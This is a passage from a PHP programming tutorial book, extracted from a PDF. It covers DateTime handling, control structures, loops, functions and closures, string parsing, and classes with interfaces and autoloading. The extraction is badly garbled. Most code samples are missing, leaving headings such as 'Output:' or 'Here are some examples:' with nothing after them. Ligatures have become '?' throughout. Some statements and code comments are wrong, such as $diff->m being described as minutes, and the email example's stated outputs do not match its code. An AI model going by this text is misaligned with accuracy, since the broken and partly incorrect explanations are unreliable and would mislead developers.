this will out put an integer indication the seconds that have elapsed since 00:00:00 UTC, Thursday, 1 January 1970.

Section 17.4: setDate
setDate sets the date in a DateTime object.


this example sets the date to be the twenty-?fth of July, 2015, it will produce the following result:


Section 17.5: Create DateTime from custom format
PHP is able to parse a number of date formats. If you want to parse a non-standard format, or if you want your code to explicitly state the format to be used, then you can use the static DateTime::createFromFormat method:
Object oriented style


Procedural style


Section 17.6: Printing DateTimes
PHP 4+ supplies a method, format that converts a DateTime object into a string with a desired format. According to PHP Manual, this is the object oriented function:


The function date() takes one parameters - a format, which is a string

Format

The format is a string, and uses single characters to de?ne the format:

Y: four digit representation of the year (eg: 2016) y: two digit representation of the year (eg: 16) m: month, as a number (01 to 12)
M: month, as three letters (Jan, Feb, Mar, etc)
j: day of the month, with no leading zeroes (1 to 31)
D: day of the week, as three letters (Mon, Tue, Wed, etc)
h: hour (12-hour format) (01 to 12)
H: hour (24-hour format) (00 to 23)
A: either AM or PM
i: minute, with leading zeroes (00 to 59) s: second, with leading zeroes (00 to 59) The complete list can be found here

Usage

These characters can be used in various combinations to display times in virtually any format. Here are some examples:

Procedural

The procedural format is similar:

Object-Oriented

Procedural Equivalent

Chapter 18: Working with Dates and Time
Section 18.1: Getting the di?erence between two dates / times
The most feasible way is to use, the DateTime class. An example:
<?php
// Create a date time object, which has the value of ~ two years ago
$twoYearsAgo = new DateTime("2014-01-18 20:05:56");
// Create a date time object, which has the value of ~ now
$now = new DateTime("2016-07-21 02:55:07");

// Calculate the diff
$diff = $now->diff($twoYearsAgo);

// $diff->y contains the difference in years between the two dates
$yearsDiff = $diff->y;
// $diff->m contains the difference in minutes between the two dates
$monthsDiff = $diff->m;
// $diff->d contains the difference in days between the two dates
$daysDiff = $diff->d;
// $diff->h contains the difference in hours between the two dates
$hoursDiff = $diff->h;
// $diff->i contains the difference in minutes between the two dates
$minsDiff = $diff->i;
// $diff->s contains the difference in seconds between the two dates
$secondsDiff = $diff->s;

// Total Days Diff, that is the number of days between the two dates
$totalDaysDiff = $diff->days;

// Dump the diff altogether just to get some details ;)
var_dump($diff);

Also, comparing two dates is much easier, just use the Comparison operators , like:


Section 18.2: Convert a date into another format
The Basics

The simplist way to convert one date format into another is to use strtotime() with date(). strtotime() will convert the date into a Unix Timestamp. That Unix Timestamp can then be passed to date() to convert it to the new format.




Or as a one-liner:


Keep in mind that strtotime() requires the date to be in a valid format. Failure to provide a valid format will result in strtotime() returning false which will cause your date to be 1969-12-31.

Using DateTime()

As of PHP 5.2, PHP o?ered the DateTime() class which o?ers us more powerful tools for working with dates (and time). We can rewrite the above code using DateTime() as so:


Working with Unix timestamps

date() takes a Unix timestamp as its second parameter and returns a formatted date for you:


DateTime() works with Unix timestamps by adding an @ before the timestamp:


If the timestamp you have is in milliseconds (it may end in 000 and/or the timestamp is thirteen characters long) you will need to convert it to seconds before you can can convert it to another format. There's two ways to do this:

Trim the last three digits o? using substr()

Trimming the last three digits can be achieved several ways, but using substr() is the easiest:


Divide the substr by 1000

You can also convert the timestamp into seconds by dividing by 1000. Because the timestamp is too large for 32 bit systems to do math on you will need to use the BCMath library to do the math as strings:


To get a Unix Timestamp you can use strtotime() which returns a Unix Timestamp:


With DateTime() you can use DateTime::getTimestamp()


If you're running PHP 5.2 you can use the U formatting option instead:



Working with non-standard and ambiguous date formats

Unfortunately not all dates that a developer has to work with are in a standard format. Fortunately PHP 5.3 provided us with a solution for that. DateTime::createFromFormat() allows us to tell PHP what format a date string is in so it can be successfully parsed into a DateTime object for further manipulation.


In PHP 5.4 we gained the ability to do class member access on instantiation has been added which allows us to turn our DateTime() code into a one-liner:


Unfortunately this does not work with DateTime::createFromFormat() yet.

Section 18.3: Parse English date descriptions into a Date format
Using the strtotime() function combined with date() you can parse di?erent English text descriptions to dates:


Section 18.4: Using Prede?ned Constants for Date Format
We can use Prede?ned Constants for Date format in date() instead of the conventional date format strings since PHP 5.1.0.

Prede?ned Date Format Constants Available

DATE_ATOM - Atom (2016-07-22T14:50:01+00:00) DATE_COOKIE - HTTP Cookies (Friday, 22-Jul-16 14:50:01 UTC) DATE_RSS - RSS (Fri, 22 Jul 2016 14:50:01 +0000)

DATE_W3C - World Wide Web Consortium (2016-07-22T14:50:01+00:00)

DATE_ISO8601 - ISO-8601 (2016-07-22T14:50:01+0000) DATE_RFC822 - RFC 822 (Fri, 22 Jul 16 14:50:01 +0000) DATE_RFC850 - RFC 850 (Friday, 22-Jul-16 14:50:01 UTC) DATE_RFC1036 - RFC 1036 (Fri, 22 Jul 16 14:50:01 +0000)
DATE_RFC1123 - RFC 1123 (Fri, 22 Jul 2016 14:50:01 +0000)

DATE_RFC2822 - RFC 2822 (Fri, 22 Jul 2016 14:50:01 +0000)

DATE_RFC3339 - Same as DATE_ATOM (2016-07-22T14:50:01+00:00)

Usage Examples



This will output: Fri, 22 Jul 16 14:50:01 +0000




This will output: 1947-08-15T00:00:00+05:30

Chapter 19: Control Structures
Section 19.1: if else
The if statement in the example above allows to execute a code fragment, when the condition is met. When you want to execute a code fragment, when the condition is not met you extend the if with an else.


PHP Manual - Control Structures - Else

The ternary operator as shorthand syntax for if-else

The ternary operator evaluates something based on a condition being true or not. It is a comparison operator and often used to express a simple if-else condition in a shorter form. It allows to quickly test a condition and often replaces a multi-line if statement, making your code more compact.
This is the example from above using a ternary expression and variable values: $a=1; $b=2;


Outputs: a is NOT greater than b.
Section 19.2: Alternative syntax for control structures
PHP provides an alternative syntax for some control structures: if, while, for, foreach, and switch.

When compared to the normal syntax, the di?erence is, that the opening brace is replaced by a colon (:) and the closing brace is replaced by endif;, endwhile;, endfor;, endforeach;, or endswitch;, respectively. For individual examples, see the topic on alternative syntax for control structures.


Multiple elseif statements using short-syntax:


PHP Manual - Control Structures - Alternative Syntax

Section 19.3: while
while loop iterates through a block of code as long as a speci?ed condition is true.



Output:

123456789

For detailed information, see the Loops topic.

Section 19.4: do-while
do-while loop ?rst executes a block of code once, in every case, then iterates through that block of code as long as a speci?ed condition is true.


For detailed information, see the Loops topic.

Section 19.5: goto
The goto operator allows to jump to another section in the program. It's available since PHP 5.3. The goto instruction is a goto followed by the desired target label: goto MyLabel;.
The target of the jump is speci?ed by a label followed by a colon: MyLabel:. This example will print Hello World!:

Section 19.6: declare
declare is used to set an execution directive for a block of code. The following directives are recognized:
ticks encoding strict_types

For instance, set ticks to 1:



To enable strict type mode, the declare statement is used with the strict_types declaration:


Section 19.7: include & require
require

require is similar to include, except that it will produce a fatal E_COMPILE_ERROR level error on failure. When the
require fails, it will halt the script. When the include fails, it will not halt the script and only emit E_WARNING.


PHP Manual - Control Structures - Require

include

The include statement includes and evaluates a ?le.

./variables.php



./main.php`



Be careful with this approach, since it is considered a code smell, because the included ?le is altering amount and content of the de?ned variables in the given scope.
You can also include ?le, which returns a value. This is extremely useful for handling con?guration arrays:

con?guration.php




main.php





This approach will prevent the included ?le from polluting your current scope with changed or added variables.

PHP Manual - Control Structures - Include

include & require can also be used to assign values to a variable when returned something by ?le. Example :
include1.php ?le :


index.php ?le :


Section 19.8: return
The return statement returns the program control to the calling function.

When return is called from within a function, the execution of the current function will end.


When you run returnEndsFunctions(); you'll get the output This is executed;

When return is called from within a function with and argument, the execution of the current function will end and the value of the argument will be returned to the calling function.
Section 19.9: for
for loops are typically used when you have a piece of code which you want to repeat a given number of times.


Outputs:

123456789

For detailed information, see the Loops topic.

Section 19.10: foreach
foreach is a construct, which enables you to iterate over arrays and objects easily.


Outputs:

123

.

To use foreach loop with an object, it has to implement Iterator interface. When you iterate over associative arrays:


Outputs:

color: red

For detailed information, see the Loops topic.

Section 19.11: if elseif else
elseif

elseif combines if and else. The if statement is extended to execute a di?erent statement in case the original if expression is not met. But, the alternative expression is only executed, when the elseif conditional expression is met.

The following code displays either "a is bigger than b", "a is equal to b" or "a is smaller than b":


Several elseif statements

You can use multiple elseif statements within the same if statement:




Section 19.12: if
The if construct allows for conditional execution of code fragments.


PHP Manual - Control Structures - If

Section 19.13: switch
The switch structure performs the same function as a series of if statements, but can do the job in fewer lines of code. The value to be tested, as de?ned in the switch statement, is compared for equality with the values in each of the case statements until a match is found and the code in that block is executed. If no matching case statement is found, the code in the default block is executed, if it exists.

Each block of code in a case or default statement should end with the break statement. This stops the execution of the switch structure and continues code execution immediately afterwards. If the break statement is omitted, the next case statement's code is executed, even if there is no match. This can cause unexpected code execution if the break statement is forgotten, but can also be useful where multiple case statements need to share the same code.


In addition to testing ?xed values, the construct can also be coerced to test dynamic statements by providing a boolean value to the switch statement and any expression to the case statement. Keep in mind the ?rst matching value is used, so the following code will output "more than 100":




For possible issues with loose typing while using the switch construct, see Switch Surprises

Chapter 20: Loops
Loops are a fundamental aspect of programming. They allow programmers to create code that repeats for some given number of repetitions, or iterations. The number of iterations can be explicit (6 iterations, for example), or continue until some condition is met ('until Hell freezes over').
This topic covers the di?erent types of loops, their associated control statements, and their potential applications in PHP.
Section 20.1: continue

The continue keyword halts the current iteration of a loop but does not terminate the loop.


Just like the break statement the continue statement is situated inside the loop body. When executed, the
continue statement causes execution to immediately jump to the loop conditional.

In the following example loop prints out a message based on the values in an array, but skips a speci?ed value.


The expected output is:


The continue statement may also be used to immediately continue execution to an outer level of a loop by specifying the number of loop levels to jump. For example, consider data such as
Fruit	Color Cost
Apple	Red	1
Banana Yellow 7
Cherry  Red	2
Grape	Green 4

In order to only make pies from fruit which cost less than 5


$data
= [

[
"Fruit"
=>
"Apple",
"Color"
=>
"Red",
"Cost"
=>
1
],
[
"Fruit"
=>
"Banana",
"Color"
=>
"Yellow",
"Cost"
=>
7
],
[
"Fruit"
=>
"Cherry",
"Color"
=>
"Red",
"Cost"
=>
2
],
[
"Fruit"
=>
"Grape",
"Color"
=>
"Green",
"Cost"
=>
4
]


When the continue 2 statement is executed, execution immediately jumps back to $data as $fruit continuing the outer loop and skipping all other code (including the conditional in the inner loop.
Section 20.2: break

The break keyword immediately terminates the current loop.


Similar to the continue statement, a break halts execution of a loop. Unlike a continue statement, however, break
causes the immediate termination of the loop and does not execute the conditional statement again.


This code will produce


but will not execute the case where $i is 0, which would result in a fatal error due to division by 0.

The break statement may also be used to break out of several levels of loops. Such behavior is very useful when executing nested loops. For example, to copy an array of strings into an output string, removing any # symbols, until the output string is exactly 160 characters


The break 2 command immediately terminates execution of both the inner and outer loops.

Section 20.3: foreach

The foreach statement is used to loop through arrays.


For each iteration the value of the current array element is assigned to $value variable and the array pointer is moved by one and in the next iteration next element will be processed.

The following example displays the items in the array assigned.


The expected output is:


You can also access the key / index of a value using foreach:


By default $value is a copy of the value in $list, so changes made inside the loop will not be re?ected in $list
afterwards.


To modify the array within the foreach loop, use the & operator to assign $value by reference. It's important to
unset the variable afterwards so that reusing $value elsewhere doesn't overwrite the array.


You can also modify the array items within the foreach loop by referencing the array key of the current item.


Section 20.4: do...while

The do...while statement will execute a block of code at least once - it then will repeat the loop as long as a condition is true.

The following example will increment the value of $i at least once, and it will continue incrementing the variable $i
as long as it has a value of less than 25;


The expected output is:


Section 20.5: for

The for statement is used when you know how many times you want to execute a statement or a block of statements.

The initializer is used to set the start value for the counter of the number of loop iterations. A variable may be declared here for this purpose and it is traditional to name it $i.
The following example iterates 10 times and displays numbers from 0 to 9.


The expected output is:


Section 20.6: while

The while statement will execute a block of code if and as long as a test expression is true.


If the test expression is true then the code block will be executed. After the code has executed the test expression will again be evaluated and the loop will continue until the test expression is found to be false.
The following example iterates till the sum reaches 100 before terminating.


The expected output is:


Chapter 21: Functions
Section 21.1: Variable-length argument lists
Version = 5.6

PHP 5.6 introduced variable-length argument lists (a.k.a. varargs, variadic arguments), using the ... token before the argument name to indicate that the parameter is variadic, i.e. it is an array including all supplied parameters from that one onward.


Type names can be added in front of the ...:


The & reference operator can be added before the ..., but after the type name (if any). Consider this example:


Output:


On the other hand, an array (or Traversable) of arguments can be unpacked to be passed to a function in the form of an argument list:


Output:


Compare with this snippet without using ...:



Output:


Therefore, redirect functions for variadic functions can now be easily made, for example:


Apart from arrays, Traversables, such as Iterator (especially many of its subclasses from SPL) can also be used. For example:


If the iterator iterates in?nitely, for example:


Di?erent versions of PHP behave di?erently:

From PHP 7.0.0 up to PHP 7.1.0 (beta 1): A segmentation fault will occur
      The PHP process will exit with code 139 In PHP 5.6:
A fatal error of memory exhaustion ("Allowed memory size of %d bytes exhausted") will be shown. The PHP process will exit with code 255

Note: HHVM (v3.10 - v3.12) does not support unpacking Traversables. A warning message "Only containers may be unpacked" will be shown in this attempt.


Section 21.2: Optional Parameters
Functions can have optional parameters, for example:




Section 21.3: Passing Arguments by Reference
Function arguments can be passed "By Reference", allowing the function to modify the variable used outside the function:


Object arguments are always passed by reference:


To avoid implicit passing an object by reference, you should clone the object.

Passing by reference can also be used as an alternative way to return parameters. For example, the
socket_getpeername function:


This method actually aims to return the address and port of the peer, but since there are two values to return, it chooses to use reference parameters instead. It can be called like this:



The variables $address and $port do not need to be de?ned before. They will:

1. be de?ned as null ?rst,
2. then passed to the function with the prede?ned null value
3. then modi?ed in the function
4. end up de?ned as the address and port in the calling context.

Section 21.4: Basic Function Usage
A basic function is de?ned and executed like this:


Section 21.5: Function Scope
Variables inside functions is inside a local scope like this


Chapter 22: Functional Programming
PHP's functional programming relies on functions. Functions in PHP provide organized, reusable code to perform a set of actions. Functions simplify the coding process, prevent redundant logic, and make code easier to follow. This topic describes the declaration and utilization of functions, arguments, parameters, return statements and scope in PHP.
Section 22.1: Closures
A closure is an anonymous function that can't access outside scope.

When de?ning an anonymous function as such, you're creating a "namespace" for that function. It currently only has access to that namespace.


It doesn't have access to any external variables. To grant this permission for this namespace to access external variables, you need to introduce it via closures (use()).


This is heavily attributed to PHP's tight variable scoping - If a variable isn't de?ned within the scope, or isn't brought in with global then it does not exist.
Also note:

Inheriting variables from the parent scope is not the same as using global variables. Global variables exist in the global scope, which is the same no matter what function is executing.


The parent scope of a closure is the function in which the closure was declared (not necessarily the function it was called from).

Taken from the PHP Documentation for Anonymous Functions

In PHP, closures use an early-binding approach. This means that variables passed to the closure's namespace using use keyword will have the same values when the closure was de?ned.
To change this behavior you should pass the variable by-reference.




Default arguments are not implicitly required when de?ning anonymous functions with/without closures.


Section 22.2: Assignment to variables
Anonymous functions can be assigned to variables for use as parameters where a callback is expected:


These variables can also be used as standalone function calls:


Section 22.3: Objects as a function


An object with an  invoke method can be used exactly as any other function.

The  invoke method will have access to all properties of the object and will be able to call any methods.

Section 22.4: Using outside variables
The use construct is used to import variables into the anonymous function's scope:


Variables can also be imported by reference:


Section 22.5: Anonymous function
An anonymous function is just a function that doesn't have a name.


In PHP, an anonymous function is treated like an expression and for this reason, it should be ended with a semicolon ;.
An anonymous function should be assigned to a variable.


Or it should be passed as parameter of another function.




Or even been returned from another function.

Self-executing anonymous functions:


Passing an argument into self-executing anonymous functions:


Section 22.6: Pure functions
A pure function is a function that, given the same input, will always return the same output and are side-e?ect
free.


Some side-e?ects are changing the ?lesystem, interacting with databases, printing to the screen.


Section 22.7: Common functional methods in PHP
Mapping

Applying a function to all elements of an array:


Be aware that this is the only method of the list where the callback comes ?rst.

Reducing (or folding)

Reducing an array to a single value:

Filtering

Returns only the array items for which the callback returns true:


Section 22.8: Using built-in functions as callbacks
In functions taking callable as an argument, you can also put a string with PHP built-in function. It's common to use trim as array_map parameter to remove leading and trailing whitespace from all strings in the array.


Section 22.9: Scope
In PHP, an anonymous function has its own scope like any other PHP function.

In JavaScript, an anonymous function can access a variable in outside scope. But in PHP, this is not permitted.


Section 22.10: Passing a callback function as a parameter
There are several PHP functions that accept user-de?ned callback functions as a parameter, such as:
call_user_func(), usort() and array_map().

Depending on where the user-de?ned callback function was de?ned there are di?erent ways to pass them:

Procedural style:



Object Oriented style:

Object Oriented style using a static method:

Chapter 23: Alternative Syntax for Control Structures
Section 23.1: Alternative if/else statement


Section 23.2: Alternative for statement


Section 23.3: Alternative while statement


Section 23.4: Alternative foreach statement




Section 23.5: Alternative switch statement


Chapter 24: String formatting
Section 24.1: String interpolation
You can also use interpolation to interpolate (insert) a variable within a string. Interpolation works in double quoted strings and the heredoc syntax only.


The complex (curly) syntax format provides another option which requires that you wrap your variable within curly braces {}. This can be useful when embedding variables within textual content and helping to prevent possible ambiguity between textual content and variables.


The {} syntax only interpolates variables starting with a $ into a string. The {} syntax does not evaluate arbitrary PHP expressions.


However, the {} syntax does evaluate any array access, property access and function/method calls on variables, array elements or properties:




Notice that the dollar $ sign can appear after the opening curly brace { as the above examples, or, like in Perl or Shell Script, can appear before it:



The Complex (curly) syntax is not called as such because it's complex, but rather because it allows for the use of 'complex expressions'. Read more about Complex (curly) syntax

Section 24.2: Extracting/replacing substrings
Single characters can be extracted using array (square brace) syntax as well as curly brace syntax. These two syntaxes will only return a single character from the string. If more than one character is needed, a function will be required, i.e.- substr
Strings, like everything in PHP, are 0-indexed.


Strings can also be changed one character at a time using the same square brace and curly brace syntax. Replacing more than one character requires a function, i.e.- substr_replace




Chapter 25: String Parsing
Section 25.1: Splitting a string by separators
explode and strstr are simpler methods to get substrings by separators.

A string containing several parts of text that are separated by a common character can be split into parts with the
explode function.


The method also supports a limit parameter that can be used as follow:


If the limit parameter is zero, then this is treated as 1.


If limit is set and positive, the returned array will contain a maximum of limit elements with the last element containing the rest of string.


If the limit parameter is negative, all components except the last -limit are returned.


explode can be combined with list to parse a string into variables in one line:


However, make sure that the result of explode contains enough elements, or an unde?ned index warning would be triggered.

strstr strips away or only returns the substring before the ?rst occurrence of the given needle.


Section 25.2: Substring
Substring returns the portion of string speci?ed by the start and length parameters.


If there is a possibility of meeting multi-byte character strings, then it would be safer to use mb_substr.



Another variant is the substr_replace function, which replaces text within a portion of a string.


Let's say you want to ?nd a speci?c word in a string - and don't want to use Regex.


Another option is a very basic parsing of an email.

$email = "test@example.com";
$wrong = "foobar.co.uk";
$notld = "foo@bar";

$at = strpos($email, "@"); // int(4)
$wat = strpos($wrong, "@"); // bool(false)
$nat = strpos($notld , "@"); // int(3)

$domain = substr($email, $at + 1); // string(11) "example.com"
$womain = substr($wrong, $wat + 1); // string(11) "oobar.co.uk"
$nomain = substr($notld, $nat + 1); // string(3) "bar"

$dot = strpos($domain, "."); // int(7)
$wot = strpos($womain, "."); // int(5)
$not = strpos($nomain, "."); // bool(false)

$tld = substr($domain, $dot + 1); // string(3) "com"
$wld = substr($womain, $wot + 1); // string(5) "co.uk"
$nld = substr($nomain , $not + 1); // string(2) "ar"

// string(25) "test@example.com is valid"
if ($at && $dot) var_dump("$email is valid"); else var_dump("$email is invalid");

// string(21) "foobar.com is invalid"
if ($wat && $wot) var_dump("$wrong is valid"); else var_dump("$wrong is invalid");

// string(18) "foo@bar is invalid"
if ($nat && $not) var_dump("$notld is valid"); else var_dump("$notld is invalid");

// string(27) "foobar.co.uk is an UK email"
if ($tld == "co.uk") var_dump("$email is a UK address");



Or even putting the "Continue reading" or "..." at the end of a blurb


Section 25.3: Searching a substring with strpos
strpos can be understood as the number of bytes in the haystack before the ?rst occurrence of the needle.

Checking if a substring exists

Be careful with checking against TRUE or FALSE because if a index of 0 is returned an if statement will see this as FALSE.


Output of the whole example:

Search starting from an o?set



Get all occurrences of a substring

Section 25.4: Parsing string using regular expressions
preg_match can be used to parse string using regular expression. The parts of expression enclosed in parenthesis are called subpatterns and with them you can pick individual parts of the string.


Output


Chapter 26: Classes and Objects
Classes and Objects are used to to make your code more e?cient and less repetitive by grouping similar tasks.

A class is used to de?ne the actions and data structure used to build objects. The objects are then built using this prede?ned structure.
Section 26.1: Class Constants
Class constants provide a mechanism for holding ?xed values in a program. That is, they provide a way of giving a name (and associated compile-time checking) to a value like 3.14 or "Apple". Class constants can only be de?ned with the const keyword - the de?ne function cannot be used in this context.
As an example, it may be convenient to have a shorthand representation for the value of p throughout a program. A class with const values provides a simple way to hold such values.


Class constants may be accessed by using the double colon operator (so-called the scope resolution operator) on a class, much like static variables. Unlike static variables, however, class constants have their values ?xed at compile time and cannot be reassigned to (e.g. MathValues::PI = 7 would produce a fatal error).
Class constants are also useful for de?ning things internal to a class that might need changing later (but do not change frequently enough to warrant storing in, say, a database). We can reference this internally using the self scope resolutor (which works in both instanced and static implementations)


Class constants can only contain scalar values in versions < 5.6

As of PHP 5.6 we can use expressions with constants, meaning math statements and strings with concatenation are acceptable constants


As of PHP 7.0, constants declared with define may now contain arrays.


Class constants are useful for more than just storing mathematical concepts. For example, if preparing a pie, it might be convenient to have a single Pie class capable of taking di?erent kinds of fruit.


We can then use the Pie class like so


The problem that arises here is, when instantiating the Pie class, no guidance is provided as to the acceptable values. For example, when making a "boysenberry" pie, it might be misspelled "boisenberry". Furthermore, we might not support a plum pie. Instead, it would be useful to have a list of acceptable fruit types already de?ned somewhere it would make sense to look for them. Say a class named Fruit:


Listing the acceptable values as class constants provides a valuable hint as to the acceptable values which a method accepts. It also ensures that misspellings cannot make it past the compiler. While new Pie('aple') and new Pie('apple') are both acceptable to the compiler, new Pie(Fruit::APLE) will produce a compiler error.
Finally, using class constants means that the actual value of the constant may be modi?ed in a single place, and any code using the constant automatically has the e?ects of the modi?cation.
Whilst the most common method to access a class constant is MyClass::CONSTANT_NAME, it may also be accessed by:


Class constants in PHP are conventionally named all in uppercase with underscores as word separators, although any valid label name may be used as a class constant name.
As of PHP 7.1, class constants may now be de?ned with di?erent visibilities from the default public scope. This means that both protected and private constants can now be de?ned to prevent class constants from unnecessarily leaking into the public scope (see Method and Property Visibility ). For example:



de?ne vs class constants

Although this is a valid construction:


If you try to do the same with class constants, you'll get an error:


But you can do:


For more information, see constants in the manual.

Using ::class to retrieve class's name

PHP 5.5 introduced the ::class syntax to retrieve the full class name, taking namespace scope and use statements into account.


The above works even if the classes are not even de?ned (i.e. this code snippet works alone).

This syntax is useful for functions that require a class name. For example, it can be used with class_exists to check a class exists. No errors will be generated regardless of return value in this snippet:


Section 26.2: Abstract Classes
An abstract class is a class that cannot be instantiated. Abstract classes can de?ne abstract methods, which are methods without any body, only a de?nition:

abstract class MyAbstractClass {



Abstract classes should be extended by a child class which can then provide the implementation of these abstract methods.
The main purpose of a class like this is to provide a kind of template that allows children classes to inherit from, "forcing" a structure to adhere to. Lets elaborate on this with an example:
In this example we will be implementing a Worker interface. First we de?ne the interface:


To ease the development of further Worker implementations, we will create an abstract worker class that already provides the run() method from the interface, but speci?es some abstract methods that need to be ?lled in by any child class:


First of all, we have provided an abstract method getMemoryLimit(). Any class extending from AbstractWorker needs to provide this method and return its memory limit. The AbstractWorker then sets the memory limit and logs it.

Secondly the AbstractWorker calls the prepareMain() and main() methods, after logging that they have been

called.

Finally, all of these method calls have been grouped in a try-catch block. So if any of the abstract methods de?ned by the child class throws an exception, we will catch that exception, log it and rethrow it. This prevents all child classes from having to implement this themselves.
Now lets de?ne a child class that extends from the AbstractWorker:


As you can see, the TransactionProcessorWorker was rather easy to implement, as we only had to specify the memory limit and worry about the actual actions that it needed to perform. No error handling is needed in the TransactionProcessorWorker because that is handled in the AbsractWorker.
Important Note

When inheriting from an abstract class, all methods marked abstract in the parent's class declaration must be de?ned by the child (or the child itself must also be marked abstract); additionally, these methods must be de?ned with the same (or a less restricted) visibility. For example, if the abstract method is de?ned as protected, the function implementation must be de?ned as either protected or public, but not private.

Taken from the PHP Documentation for Class Abstraction.

If you do not de?ne the parent abstract classes methods within the child class, you will be thrown a Fatal PHP Error like the following.

Fatal error: Class X contains 1 abstract method and must therefore be declared abstract or implement the remaining methods (X::x) in

Section 26.3: Late static binding
In PHP 5.3+ and above you can utilize late static binding to control which class a static property or method is called

from. It was added to overcome the problem inherent with the self:: scope resolutor. Take the following code


You would expect that the MrEd class will override the parent whatToSay() function. But when we run this we get something unexpected


The problem is that self::whatToSay(); can only refer to the Horse class, meaning it doesn't obey MrEd. If we switch to the static:: scope resolutor, we don't have this problem. This newer method tells the class to obey the instance calling it. Thus we get the inheritance we're expecting


Section 26.4: Namespacing and Autoloading
Technically, autoloading works by executing a callback when a PHP class is required but not found. Such callbacks usually attempt to load these classes.
Generally, autoloading can be understood as the attempt to load PHP ?les (especially PHP class ?les, where a PHP source ?le is dedicated for a speci?c class) from appropriate paths according to the class's fully-quali?ed name (FQN) when a class is needed.
Suppose we have these classes:

Class ?le for application\controllers\Base:


Class ?le for application\controllers\Control:


Class ?le for application\models\Page:


Under the source folder, these classes should be placed at the paths as their FQNs respectively:

Source folder
applications
controllers
Base.php Control.php
models
Page.php

This approach makes it possible to programmatically resolve the class ?le path according to the FQN, using this function:


The spl_autoload_register function allows us to load a class when needed using a user-de?ned function:


This function can be further extended to use fallback methods of loading:




Note that PHP doesn't attempt to load the classes whenever a ?le that uses this class is loaded. It may be loaded in the middle of a script, or even in shutdown functions . This is one of the reasons why developers, especially those who use autoloading, should avoid replacing executing source ?les in the runtime, especially in phar ?les.
Section 26.5: Method and Property Visibility
There are three visibility types that you can apply to methods (class/object functions) and properties (class/object variables) within a class, which provide access control for the method or property to which they are applied.
You can read extensively about these in the PHP Documentation for OOP Visibility.

Public
Declaring a method or a property as public allows the method or property to be accessed by: The class that declared it.
The classes that extend the declared class.
Any external objects, classes, or code outside the class hierarchy.

An example of this public access would be:


Protected
Declaring a method or a property as protected allows the method or property to be accessed by: The class that declared it.
The classes that extend the declared class.

This does not allow external objects, classes, or code outside the class hierarchy to access these methods or properties. If something using this method/property does not have access to it, it will not be available, and an error will be thrown. Only instances of the declared self (or subclasses thereof) have access to it.
An example of this protected access would be:




The example above notes that you can only access the protected elements within it's own scope. Essentially: "What's in the house can only be access from inside the house."

Private

Declaring a method or a property as private allows the method or property to be accessed by: The class that declared it Only (not subclasses).
A private method or property is only visible and accessible within the class that created it.

Note that objects of the same type will have access to each others private and protected members even though they are not the same instances.




As noted, you can only access the private method/property from within it's de?ned class.
Section 26.6: Interfaces
Introduction

Interfaces are de?nitions of the public APIs classes must implement to satisfy the interface. They work as "contracts", specifying what a set of subclasses does, but not how they do it.
Interface de?nition is much alike class de?nition, changing the keyword class to interface:


Interfaces can contain methods and/or constants, but no attributes. Interface constants have the same restrictions as class constants. Interface methods are implicitly abstract:


Note: interfaces must not declare constructors or destructors, since these are implementation details on the class level.
Realization

Any class that needs to implement an interface must do so using the implements keyword. To do so, the class needs to provide a implementation for every method declared in the interface, respecting the same signature.

A single class can implement more than one interface at a time.




When abstract classes implement interfaces, they do not need to implement all methods. Any method not implemented in the base class must then be implemented by the concrete class that extends it:


Notice that interface realization is an inherited characteristic. When extending a class that implements an interface, you do not need to redeclare it in the concrete class, because it is implicit.

Note: Prior to PHP 5.3.9, a class could not implement two interfaces that speci?ed a method with the same name, since it would cause ambiguity. More recent versions of PHP allow this as long as the duplicate methods have the same signature[1].

Inheritance

Like classes, it is possible to establish an inheritance relationship between interfaces, using the same keyword
extends. The main di?erence is that multiple inheritance is allowed for interfaces:

Examples

In the example bellow we have a simple example interface for a vehicle. Vehicles can go forwards and backwards.

interface VehicleInterface {
public function forward();

public function reverse();

...
}

class Bike implements VehicleInterface {
public function forward() {
$this->pedal();
}

public function reverse() {
$this->backwardSteps();
}

protected function pedal() {
...
}

protected function backwardSteps() {
...
}

...
}

class Car implements VehicleInterface {
protected $gear = 'N';

public function forward() {
$this->setGear(1);
$this->pushPedal();
}

public function reverse() {
$this->setGear('R');
$this->pushPedal();
}

protected function setGear($gear) {
$this->gear = $gear;
}

protected function pushPedal() {
...
}

...
}

Then we create two classes that implement the interface: Bike and Car. Bike and Car internally are very di?erent, but both are vehicles, and must implement the same public methods that VehicleInterface provides.
Typehinting allows methods and functions to request Interfaces. Let's assume that we have a parking garage class, which contains vehicles of all kinds.




Because addVehicle requires a $vehicle of type VehicleInterface-not a concrete implementation-we can input both Bikes and Cars, which the ParkingGarage can manipulate and use.
Section 26.7: Final Keyword
Def: Final Keyword prevents child classes from overriding a method by pre?xing the de?nition with ?nal. If the class itself is being de?ned ?nal then it cannot be extended
Final Method


Final Class:


Final constants: Unlike Java, the final keyword is not used for class constants in PHP. Use the keyword const
instead.

Why do I have to use final?

1. Preventing massive inheritance chain of doom
2. Encouraging composition
3. Force the developer to think about user public API
4. Force the developer to shrink an object's public API

5. A final class can always be made extensible
6. extends breaks encapsulation
7. You don't need that ?exibility
8. You are free to change the code

When to avoid final: Final classes only work e?ectively under following assumptions:

1. There is an abstraction (interface) that the ?nal class implements
2. All of the public API of the ?nal class is part of that interface

Section 26.8: Autoloading
Nobody wants to require or include every time a class or inheritance is used. Because it can be painful and is easy to forget, PHP is o?ering so called autoloading. If you are already using Composer, read about autoloading using Composer.

What exactly is autoloading?

The name basically says it all. You do not have to get the ?le where the requested class is stored in, but PHP
automatically loads it.

How can I do this in basic PHP without third party code?

There is the function   autoload, but it is considered better practice to use spl_autoload_register. These functions will be considered by PHP every time a class is not de?ned within the given space. So adding autoload to an existing project is no problem, as de?ned classes (via require i.e.) will work like before. For the sake of preciseness, the following examples will use anonymous functions, if you use PHP < 5.3, you can de?ne the function and pass it's name as argument to spl_autoload_register.
Examples


The code above simply tries to include a ?lename with the class name and the appended extension ".php" using
sprintf. If FooBar needs to be loaded, it looks if FooBar.php exists and if so includes it.

Of course this can be extended to ?t the project's individual need. If _ inside a class name is used to group, e.g.
User_Post and User_Image both refer to User, both classes can be kept in a folder called "User" like so:


The class User_Post will now be loaded from "User/Post.php", etc.

spl_autoload_register can be tailored to various needs. All your ?les with classes are named "class.CLASSNAME.php"? No problem. Various nesting (User_Post_Content => "User/Post/Content.php")? No problem either.

If you want a more elaborate autoloading mechanism - and still don't want to include Composer - you can work without adding third party libraries.


Using autoloaders like this, you can happily write code like this:


Using classes:


These examples will be include classes from foo/bar.php, foo.php, hello/world.php and demo/classes.php.

Section 26.9: Calling a parent constructor when instantiating a child
